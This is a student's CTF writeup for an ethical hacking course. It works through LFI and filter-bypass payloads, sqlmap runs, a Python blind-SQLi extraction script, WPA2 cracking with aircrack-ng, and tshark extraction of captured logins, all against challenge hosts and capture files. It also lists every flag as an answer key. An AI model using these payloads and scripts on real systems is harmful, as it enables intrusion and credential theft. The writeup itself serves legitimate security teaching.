---
title: "ICT2212 Ethical Hacking - School CTF 2 Writeup"
course: ICT2212 Ethical Hacking
date: 2026-10-24
tags:
  - ctf
  - writeup
  - lfi
  - directory-traversal
  - sqli
  - sqlmap
  - wireless
  - wireshark
  - aircrack-ng
---

# ICT2212 Ethical Hacking: School CTF 2 Writeup

> [!abstract] Overview
> Writeups and reusable command snippets for the ICT2212 CTF covering **Directory Traversal & LFI**, **SQL Injection (SQLi)**, and **Wireless Network Analysis (802.11)**.

---

## 1. Directory Traversal and LFI

### Initial Reconnaissance (`nslookup`)
```bash
nslookup sit-lfi.chals.io
```
```text
Server:     10.255.255.254
Address:    10.255.255.254#53

Non-authoritative answer:
Name:   sit-lfi.chals.io
Address: 143.244.222.115
Name:   sit-lfi.chals.io
Address: 143.244.222.116
```

---

### Level 1: Basic Directory Traversal
> [!question] Challenge Prompt
> Read `notes.txt` from the `secrets` folder located beside the web root.

* **Target URL:** `https://sit-lfi.chals.io/reader.php?page=welcome.php`
* **Analysis:** The application likely sits in a subfolder of the web root, such as `/var/www/html/reader.php`.
  * The first `../` moves up one directory to `/var/www/html`.
  * The second `../` moves up to `/var/www/`.
  * Appending `secrets/notes.txt` resolves to `/var/www/secrets/notes.txt`.

#### Exploit
```bash
curl "https://sit-lfi.chals.io/reader.php?page=../../secrets/notes.txt"
```

> [!success] Flag
> `SIT{611f20101514915cb2a3a6e39070703f}`

---

### Level 2: Non-Recursive Filter Bypass
> [!question] Challenge Prompt
> The review team's document, `review.txt`, is located in the same `secrets` folder above the public pages. Find the flag in `review.txt`.

* **Target URL:** `https://sit-lfi.chals.io/translations.php?page=en.php`
* **Analysis:** Since this is Level 2, there is a backend filter that sanitizes input via non-recursive string replacement (stripping `../`).
* **Bypass:** We use `....//` (or `..//...//`). When the filter strips `../` once, the remaining characters collapse into a valid `../`.

#### Exploit
```bash
curl "https://sit-lfi.chals.io/translations.php?page=..//...//secrets/review.txt"
```

> [!success] Flag
> `SIT{29511d2275d99daeeb8d8fcf77344674}`

---

### Level 3: PHP Wrapper (`php://filter`)
> [!question] Challenge Prompt
> Read the file content at `secrets/audit.php` for this flag.

* **Target URL:** `https://sit-lfi.chals.io/archive.php?page=content/languages/en.php`
* **Analysis:** Because `audit.php` is a PHP file (not a `.txt` file), normal directory traversal causes the server to execute the script via `include()` or `require()`, returning a blank output instead of the source code.
* **Bypass (`php://filter`):**
  * **Decoded Payload:** `php://filter/convert.base64-encode/resource=../secrets/audit.php`
  * **`php://filter`:** Built-in PHP wrapper that applies a stream filter to a resource before `include()` executes it.
  * **`convert.base64-encode`:** Encodes the raw PHP source code (including `<?php ?>` tags) into clean printable Base64 ASCII so it does not get executed or mangled by HTML rendering.
  * **`resource=../secrets/audit.php`:** Specifies the target file path to filter.

#### Exploit
```bash
curl -s "https://sit-lfi.chals.io/archive.php?page=php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D..%2Fsecrets%2Faudit.php"
```

php://filter/convert.base64-encode/resource=../secrets/audit.php
#### Response & Decoding
```html
<div class="document">
PD9waHAKLyoKICogQXJjaGl2ZSBhdWRpdCBzdGFtcC4KICogVmVyaWZpY2F0aW9uIGNvZGU6IFNJVHswOTVjY2VIZjM0YWY4ODAyZjk1NDMyYTZkY2E1NDZINn0KICovCg==
</div>
```

Decode the Base64 string:
```bash
echo "PD9waHAKLyoKICogQXJjaGl2ZSBhdWRpdCBzdGFtcC4KICogVmVyaWZpY2F0aW9uIGNvZGU6IFNJVHswOTVjY2VIZjM0YWY4ODAyZjk1NDMyYTZkY2E1NDZINn0KICovCg==" | base64 -d
```

> [!success] Flag
> `SIT{095cceef34af8802f95432a6dca546e6}`

---

## 2. SQL Injection (SQLi)

### Challenge 1: Catalog (GET Parameter / UNION Enumeration)
* **Target URL:** `https://sit-sqli.chals.io/catalog?item=1` (triggered by clicking "View" on the catalog page).

#### Step 1: Detect Injectable Parameter & Enumerate Tables
```bash
sqlmap -u "https://sit-sqli.chals.io/catalog?item=1" --batch
```
* `--batch`: Automatically answers `sqlmap` prompts using default options.
* Discovered tables: `flag` and `products`.

#### Step 2: Dump the `flag` Table
```bash
sqlmap -u "https://sit-sqli.chals.io/catalog?item=1" --batch -T flag --dump
```

> [!success] Flag
> `SIT{l1_un10n_3num3r4t3s_th3_c4t4l0g}`

---

### Challenge 2: Cart (POST JSON Body Injection)
* **Target URL:** `https://sit-sqli.chals.io/cart`
* **Analysis:** Clicking "Add to Cart" does not change the URL, indicating a `POST` request.
* **Inspecting Network Traffic:** `Inspect > Network > Click "Add to Cart" > Right-click entry > Copy as fetch (Node.js)`:

```javascript
fetch("https://sit-sqli.chals.io/cart", {
  "headers": {
    "accept": "*/*",
    "accept-language": "en-US,en;q=0.9",
    "content-type": "application/json",
    "Referer": "https://sit-sqli.chals.io/cart"
  },
  "body": "{\"id\":\"1\"}",
  "method": "POST"
});
```

#### Exploit with `sqlmap`
```bash
sqlmap -u "https://sit-sqli.chals.io/cart" \
  --data='{"id":"1"}' \
  --headers="Content-Type: application/json" \
  --batch --dbms=sqlite \
  -T flag --dump
```

> [!success] Flag
> `SIT{l2_json_body_1nj3ct10n}`

---

### Challenge 3: Account (Cookie-Based Blind SQLi)
* **Target URL:** `https://sit-sqli.chals.io/account`
* **Initial Behavior:** Page displays: *"No member is registered under that id, so there is no account to show. Check the id and try again."* There are no buttons or `<form>`/`<input>` elements in the HTML.

#### Step 1: Enumerate Input Vectors
1. **Test URL Query Parameters & Path Parameters:**
   ```bash
   curl -s "https://sit-sqli.chals.io/account"
   curl -s "https://sit-sqli.chals.io/account?id=1"
   curl -s "https://sit-sqli.chals.io/account/1" # Returns 404
   ```
2. **Check Allowed HTTP Methods & Response Cookies:**
   ```bash
   curl -s -i -X OPTIONS "https://sit-sqli.chals.io/account" | grep -i allow
   # Output: Allow: GET, HEAD, OPTIONS

   curl -s -i "https://sit-sqli.chals.io/account" | grep -i set-cookie
   # Output: (Blank - server doesn't set a cookie automatically)
   ```

> [!tip] Reusable CTF Snippet: Fuzzing Query Parameters & Cookies
> **1. Brute-force GET Query Parameters:**
> ```bash
> base="https://sit-sqli.chals.io/account"
> baseline=$(curl -s "$base" | wc -c)
> for p in id uid user member account custid sid session token; do
>   r=$(curl -s -G "$base" --data-urlencode "$p=1'")
>   [ "$(echo -n "$r" | wc -c)" != "$baseline" ] && echo "DIFF: $p"
> done
> ```
> **2. Brute-force Request Cookies:**
> ```bash
> base="https://sit-sqli.chals.io/account"
> baselen=$(curl -s "$base" | wc -c) # 1052
> for c in id uid user userid member memberid account acct customer sid session token auth; do
>   r=$(curl -s -b "$c=1" "$base")
>   len=$(echo -n "$r" | wc -c)
>   [ "$len" != "$baselen" ] && echo ">>> cookie $c len=$len"
> done
> ```
> * **Result:** `>>> cookie uid len=974` and response text shows `1 profile(s) matched`.

#### Step 2: Confirm SQLi in the `uid` Cookie
```bash
base="https://sit-sqli.chals.io/account"
curl -s -H "Cookie: uid=1" "$base"   # -> 1 profile(s) matched (Valid)
curl -s -H "Cookie: uid=999" "$base" # -> No member (Invalid)
curl -s -H "Cookie: uid=1'" "$base"  # -> SQL error: unrecognized token: "'1'""
```

#### Step 3: Exploit with `sqlmap`
```bash
sqlmap -u "https://sit-sqli.chals.io/account" \
  --cookie="uid=1*" \
  --batch --dbms=sqlite --technique=B \
  --string="profile(s) matched" \
  -T flag --dump
```
* `*`: Injection marker telling `sqlmap` to inject payloads directly after `uid=1` (e.g., `uid=1 AND ...`).

> [!success] Flag
> `SIT{l3_c00k13s_count_t00}`

---

### Challenge 4: Search (Filter Bypass / Symbol-less Blind SQLi)
* **Target URL:** `https://sit-sqli.chals.io/search?q=1`
* **Initial Behavior:**
  * `q=1` to `5`: Returns `1 title(s) matched.`
  * `q=6` onwards: Returns `No post carries that number, so there is nothing to show here. Post numbers run from 1 upwards.`

#### Step 1: Probe the Vulnerability & Filter
1. **Confirm Raw SQLi:**
   ```bash
   curl -s "https://sit-sqli.chals.io/search?q=1'"
   # Returns: SQL error: unrecognized token: "'"
   ```
2. **Determine Column Count (`ORDER BY`):**
   ```bash
   curl -s "https://sit-sqli.chals.io/search?q=1%20ORDER%20BY%201--" # -> 1 title(s) matched
   curl -s "https://sit-sqli.chals.io/search?q=1%20ORDER%20BY%202--" # -> 1st ORDER BY term out of range (1 column confirmed)
   ```
3. **Test Standard `UNION` and `AND 1=1` / `1=2`:**
   ```bash
   curl -s -G "https://sit-sqli.chals.io/search" --data-urlencode "q=1 UNION SELECT flag FROM flag--"
   # Only displays "1 title(s) matched" (row contents are not reflected on the page).

   curl -s -G "https://sit-sqli.chals.io/search" --data-urlencode "q=1 AND 1=1" # -> 1 title(s) matched
   curl -s -G "https://sit-sqli.chals.io/search" --data-urlencode "q=1 AND 1=2" # -> 1 title(s) matched (Should be false!)
   ```
4. **Identify Character Filtering (`=`, `<`, `>`):**
   ```bash
   curl -s -G "https://sit-sqli.chals.io/search" --data-urlencode "q=99999999 OR 0=1" # -> true (should be false)
   curl -s -G "https://sit-sqli.chals.io/search" --data-urlencode "q=99999999 OR 9=8" # -> true (should be false)
   curl -s -G "https://sit-sqli.chals.io/search" --data-urlencode "q=99999999 OR 0"   # -> false (correct, no "=")
   curl -s -G "https://sit-sqli.chals.io/search" --data-urlencode "q=99999999 OR 0=0" # -> false ("=" stripped -> becomes "OR 00")
   ```
   * **Discovery:** The `=` (along with `<` and `>`) characters are stripped by the backend! When `=` is stripped, `1=2` becomes `12` (truthy in SQLite), and `0=0` becomes `00` (falsy in SQLite).

#### Step 2: Build a Boolean Oracle Using `LIKE` and `BETWEEN`
Since `=`, `<`, and `>` are filtered, we can use SQL keywords like `LIKE` or `BETWEEN`:
```bash
# TRUE Oracle (Returns: 5 title(s) matched)
curl -s -G "https://sit-sqli.chals.io/search" --data-urlencode "q=99999999 OR (SELECT flag FROM flag) LIKE 'S%'"

# FALSE Oracle (Returns: No post carries that number)
curl -s -G "https://sit-sqli.chals.io/search" --data-urlencode "q=99999999 OR (SELECT flag FROM flag) LIKE 'Z%'"
```

#### Step 3: Binary Search Extraction Script (`BETWEEN` + `unicode(substr())`)
```python
import urllib.request
import urllib.parse

URL = "https://sit-sqli.chals.io/search"
SUB = "(SELECT flag FROM flag LIMIT 1)"

def true(cond):
    # Base post id 1 exists; '=', '<', '>' are filtered, so use BETWEEN (keyword, no symbols)
    q = f"1 AND {cond}"
    u = URL + "?" + urllib.parse.urlencode({"q": q})
    with urllib.request.urlopen(u, timeout=20) as r:
        return "title(s) matched" in r.read().decode("utf-8", "replace")

flag, pos = "", 1
while true(f"unicode(substr({SUB}, {pos}, 1)) BETWEEN 1 AND 255"):
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        # Binary search the ASCII codepoint
        if true(f"unicode(substr({SUB}, {pos}, 1)) BETWEEN {lo} AND {mid}"):
            hi = mid
        else:
            lo = mid + 1
    flag += chr(lo)
    print(f"[{pos:02d}] {flag}")
    pos += 1

print(f"FLAG: {flag}")
```

> [!success] Flag
> `SIT{l4_3qu4ls_by_4n0th3r_n4m3}`

---

### Challenge 5: Orders (Signature Bypass via `--eval` in `sqlmap`)
* **Observed URLs:**
  * Order 1: `https://sit-sqli.chals.io/orders?id=1&h=c4ca4238a0b923820dcc509a6f75849b`
  * Order 2: `https://sit-sqli.chals.io/orders?id=2&h=c81e728d9d4c2f636f067f89cc14862c`
  * Order 3: `https://sit-sqli.chals.io/orders?id=3&h=eccbc87e4b5ce2fe28308fd9f2a7baf3`

#### Step 1: Analyze the Signature Parameter (`h`)
Check if `h` is simply an unsalted MD5 hash of `id`:
```bash
echo -n "1" | md5sum
# Output: c4ca4238a0b923820dcc509a6f75849b (Matches Order 1!)
```
Testing with an invalid hash:
```bash
curl -s "https://sit-sqli.chals.io/orders?id=1&h=00000000000000000000000000000000"
# Output: "That lookup carried no valid signature for its id."
```
Because no secret salt or HMAC key is used, we can forge a valid `h = md5(id)` signature for any SQLi payload.

#### Step 2: Confirm True / False Oracles
```bash
# TRUE Payload -> Returns "Order found."
payload="1 AND 1=1"
h=$(echo -n "$payload" | md5sum | cut -d' ' -f1)
curl -s -G "https://sit-sqli.chals.io/orders" --data-urlencode "id=$payload" --data-urlencode "h=$h"

# FALSE Payload -> Returns "No such order."
payload="1 AND 1=2"
h=$(echo -n "$payload" | md5sum | cut -d' ' -f1)
curl -s -G "https://sit-sqli.chals.io/orders" --data-urlencode "id=$payload" --data-urlencode "h=$h"
```

#### Step 3: Automate with `sqlmap --eval`
```bash
sqlmap -u "https://sit-sqli.chals.io/orders?id=1*&h=c4ca4238a0b923820dcc509a6f75849b" \
  --batch --dbms=sqlite \
  --technique=B \
  --string="Order found" \
  --delay=2 \
  --eval="import hashlib; h=hashlib.md5(id.encode()).hexdigest()" \
  -T flag --dump
```

> [!info] How the `sqlmap` Command Works
> * **`id=1*`**: Instructs `sqlmap` to inject payloads at the `*` marker (e.g., `id=1 AND (SELECT SUBSTR(flag,1,1) FROM flag)='S'`).
> * **`--technique=B`**: Uses Boolean-based Blind SQLi. Since `id=1` is a valid order, the left side of `AND` is always `TRUE`. The subquery checks one character of the `flag` table at a time using `SUBSTR()`.
> * **`--string="Order found"`**: Tells `sqlmap` how to recognize when the injected condition evaluates to `TRUE`.
> * **`--eval="..."`**: Executes the Python snippet before sending each HTTP request, dynamically recalculating `h = md5(id)` so the backend signature check passes for every injected payload.
> * **`--delay=2`**: Adds a 2-second delay between requests to avoid rate-limiting.

> [!success] Flag
> `SIT{l5_s1gn3d_1snt_s4n1t1z3d}`

---

## 3. Wireless Network Analysis (802.11)

### Challenge 1: Hidden in Plain Sight
> [!question] Challenge Prompt
> A facilities team hid its Wi-Fi network name. Can you find the network that laptop `00:21:6a:8e:3c:51` successfully joins in `survey.pcap`? Recover its **SSID**, **BSSID**, and the **Association ID** (in decimal) assigned in the successful response.

#### Step 1: Filter Association Responses in Wireshark
Apply the following Wireshark display filter to `survey.pcap`:
```wireshark
(wlan.fc.type_subtype == 1 || wlan.fc.type_subtype == 3) && wlan.da == 00:21:6a:8e:3c:51 && wlan.fixed.status_code == 0
```

* **`wlan.da == 00:21:6a:8e:3c:51`**: Filters for frames sent to the target laptop's MAC address.
* **`wlan.fc.type_subtype == 1 || wlan.fc.type_subtype == 3`**:
  * `0`: Association Request (laptop to AP)
  * `1`: Association Response (AP to laptop)
  * `3`: Reassociation Response (laptop reconnecting)
* **`wlan.fixed.status_code == 0`**: Filters for a **successful** association (`0` = Success, `1` = Unspecified failure, `12` = Association denied, `18` = Association denied due to unsupported rates).

#### Step 2: Extract Values from Packet Details
1. **Association ID (AID):**
   * In the Association Response (`subtype == 1`), navigate to `IEEE 802.11 Wireless Management > Fixed Parameters > Association ID`.
   * Value is `0x0525` $\rightarrow$ Convert to decimal: **`1317`**.
2. **BSSID:**
   * In the IEEE 802.11 header of the Association Response, the BSSID is `00:1b:54:93:7a:20` $\rightarrow$ **`001b54937a20`**.
3. **SSID:**
   * Inspect the corresponding **Association Request (`subtype == 0`)** sent by the laptop just prior to the response.
   * Navigate to `IEEE 802.11 Wireless Management > Tagged Parameters > Tag: SSID parameter set` $\rightarrow$ **`Campus-Archive`**.

> [!success] Flag
> `SIT{Campus-Archive_001b54937a20_1317}`

---

### Challenge 2: Four Messages One Secret
> [!question] Challenge Prompt
> The campus club uses WPA2-Personal, but its Wi-Fi passphrase may be predictable. The capture (`wireless.pcap`) records a laptop joining `Campus-Club` and retrieving a document from an internal web archive.

#### Step 1: Crack the WPA2 Handshake with `aircrack-ng`
```bash
aircrack-ng -w wordlist.txt -e "Campus-Club" wireless.pcap
```
* **Result:** `KEY FOUND! [ LibraryWeek2024#1 ]`

#### Step 2: Decrypt Traffic with `airdecap-ng`
```bash
airdecap-ng -e "Campus-Club" -p "LibraryWeek2024#1" wireless.pcap
```
* Generates decrypted capture file: `wireless-dec.pcap`.

#### Step 3: Extract HTTP Payload with `tshark`
```bash
tshark -r wireless-dec.pcap -T fields -e text -e http.file_data
```

> [!success] Flag
> `SIT{handshake_then_decrypt_8b2e6d}`

---

### Challenge 3: Same Name, Different AP (Evil Twin Attack)
> [!question] Challenge Prompt
> This cafe offers free Wi-Fi on `Cafe-Guest`. The password is written on the chalkboard beside the till: `FlatWhite2026CafeGuest`. During a busy afternoon, someone ran a deauth attack and followed up with an Evil Twin attack to bait a target into connecting to their rogue AP (`evil-twin.pcap`).

#### Step 1: Decrypt 802.11 Traffic & Extract POST Logins
*(Optional Wireshark GUI method: `Edit > Preferences > Protocols > IEEE 802.11 > Decryption keys` $\rightarrow$ Add `wpa-pwd` key: `FlatWhite2026CafeGuest:Cafe-Guest`)*

Using `tshark` directly via CLI:
```bash
tshark -r evil-twin.pcap \
  -o "wlan.enable_decryption:TRUE" \
  -o 'uat:80211_keys:"wpa-pwd","FlatWhite2026CafeGuest:Cafe-Guest"' \
  -Y 'http.request.method == "POST"' \
  -T fields \
  -e http.request.uri \
  -e http.file_data \
  -e urlencoded-form.value
```

* **`-r evil-twin.pcap`**: Reads the capture file.
* **`-o "wlan.enable_decryption:TRUE"`**: Enables 802.11 wireless payload decryption.
* **`-o 'uat:80211_keys:"wpa-pwd","FlatWhite2026CafeGuest:Cafe-Guest"'`**: Supplies the WPA2 passphrase and SSID.
* **`-Y 'http.request.method == "POST"'`**: Filters for HTTP `POST` form submissions.
* **`-T fields -e ...`**: Outputs the request URI, raw hex body, and parsed form values.

#### Step 2: Analyze Extracted Credentials
```text
/login  ...  tariq.abdullah, Gupta_cafe18
/login  ...  yuki.abdullah, Nair2026!19
/login  ...  amir.baker, Abdullah_latte20
/login  ...  tariq.chong, Gupta_cafe58
/login  ...  yuki.chong, Nair2026!59
/login  ...  amir.diaz, Abdullah_latte60
/login  ...  bella.diaz, Hansen#guest61
/login  ...  ines.eriksen, Jones202687
/login  ...  jonas.eriksen, Quek#202688
/login  ...  kavya.eriksen, Diaz!wifi89
/login  ...  liam.eriksen, Khan_cafe90
/login  ...  mei.eriksen, Singh2026!91
/login  ...  nadia.eriksen, Eriksen_latte92
/login  ...  omar.eriksen, Lim#guest93
/login  ...  priya.eriksen, Tan_portal94
/login  ...  quinn.eriksen, Farooq202695
/login  ...  dana.rahman, HazelnutLatte42   <-- Anomaly / Target Victim
/login  ...  ravi.eriksen, Mohd#202696
/login  ...  sofia.eriksen, Wong!wifi97
/login  ...  tariq.eriksen, Gupta_cafe98
/login  ...  yuki.eriksen, Nair2026!99
```

* **Pattern Analysis:** Automated/background logins follow a strict alphabetical surname batch pattern (`.abdullah`, `.baker`, `.chong`, `.diaz`, `.eriksen`) with sequential numbers at the end of their passwords (`18`, `19`, `20`... `95`, `96`, `97`).
* **Target Identification:** Right in the middle of the `.eriksen` batch (`95` to `96`), **`dana.rahman`** logs in with **`HazelnutLatte42`**, breaking both the surname and password numbering pattern.

> [!success] Flag
> `SIT{dana.rahman_HazelnutLatte42}`